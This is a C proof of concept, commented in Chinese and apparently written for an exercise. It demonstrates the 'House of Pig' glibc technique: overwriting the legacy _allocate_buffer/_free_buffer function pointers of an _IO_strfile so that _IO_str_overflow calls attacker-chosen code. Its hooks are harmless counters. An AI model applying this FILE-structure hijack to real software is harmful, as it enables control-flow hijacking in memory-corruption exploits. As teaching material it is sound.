#define _GNU_SOURCE

#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
 * House of Pig 的现代介绍通常从 malloc -> memcpy -> free 讲起，但
 * glibc 2.23~2.27 的 _IO_str_overflow 并不直接调用 malloc/free：
 *
 *   首先调用 ((_IO_strfile *) fp)->_s._allocate_buffer(new_size) 分配新缓冲区；
 *   memcpy(new_buf, old_buf, old_blen);
 *   最后调用 ((_IO_strfile *) fp)->_s._free_buffer(old_buf) 释放旧缓冲区。
 *
 * 本 PoC 使用 open_memstream 创建一个 vtable 完全合法的 _IO_strfile，
 * 只改写 FILE 尾部的两个旧式回调。这样既能真正走到源码中的最终触发点，
 * 又能用计数器严格证明两个函数指针都被调用，而不是只展示内存布局。
 *
 * x86-64 ABI 布局（glibc 2.23~2.43 的 FILE 大小均为 0xd8）：
 *   FILE + 0xd8 : 合法 _IO_mem_jumps vtable
 *   FILE + 0xe0 : _allocate_buffer（2.28 起仅保留为 unused ABI 字段）
 *   FILE + 0xe8 : _free_buffer    （2.28 起仅保留为 unused ABI 字段）
 */

typedef void *(*allocate_fn)(size_t);
typedef void (*free_fn)(void *);

static size_t allocate_calls;
static size_t free_calls;
static size_t requested_size;
static void *freed_pointer;

static void *observed_allocate(size_t size)
{
    ++allocate_calls;
    requested_size = size;
    return malloc(size);
}

static void observed_free(void *pointer)
{
    ++free_calls;
    freed_pointer = pointer;
    free(pointer);
}

int main(void)
{
    char *published_buffer = NULL;
    size_t published_size = 0;
    FILE *stream = open_memstream(&published_buffer, &published_size);
    assert(stream != NULL);

    /* 这些断言把 PoC 限定在题目要求的 x86-64 glibc ABI。 */
    assert(sizeof(FILE) == 0xd8);
    assert(sizeof(void *) == 8);

    char *old_buffer = stream->_IO_buf_base;
    size_t old_length = (size_t)(stream->_IO_buf_end - old_buffer);
    assert(old_buffer != NULL);
    assert(old_length != 0);

    /*
     * vtable 紧跟 FILE；再后面的两个指针才是 _IO_str_fields。
     * 保存原值是为了在验证完成后正常 fclose，避免教学 PoC 泄漏资源。
     */
    allocate_fn *allocate_slot =
        (allocate_fn *)((unsigned char *)stream + sizeof(FILE) + sizeof(void *));
    free_fn *free_slot =
        (free_fn *)((unsigned char *)stream + sizeof(FILE) + 2 * sizeof(void *));
    allocate_fn original_allocate = *allocate_slot;
    free_fn original_free = *free_slot;
    assert(original_allocate != NULL);
    assert(original_free != NULL);

    *allocate_slot = observed_allocate;
    *free_slot = observed_free;

    /*
     * 把写指针推到缓冲区末尾。下一次 fputc 无法走快速写入路径，必然经
     * 合法 _IO_mem_jumps.overflow 进入 _IO_str_overflow 的扩容分支。
     */
    stream->_IO_read_base = old_buffer;
    stream->_IO_read_ptr = old_buffer;
    stream->_IO_read_end = old_buffer;
    stream->_IO_write_base = old_buffer;
    stream->_IO_write_ptr = stream->_IO_buf_end;
    stream->_IO_write_end = stream->_IO_buf_end;

    assert(fputc('P', stream) == 'P');

    /*
     * 旧分支的新大小公式是 2 * old_blen + 100；同时先分配、后释放旧块。
     * freed_pointer 必须等于触发前保存的 old_buffer。
     */
    assert(allocate_calls == 1);
    assert(free_calls == 1);
    assert(requested_size == 2 * old_length + 100);
    assert(freed_pointer == old_buffer);
    assert(stream->_IO_buf_base != old_buffer);
    assert(stream->_IO_write_ptr == stream->_IO_buf_base + old_length + 1);
    assert(stream->_IO_buf_base[old_length] == 'P');

    puts("[+] Pig：旧式回调命中");

    *allocate_slot = original_allocate;
    *free_slot = original_free;
    assert(fclose(stream) == 0);
    free(published_buffer);
    return 0;
}
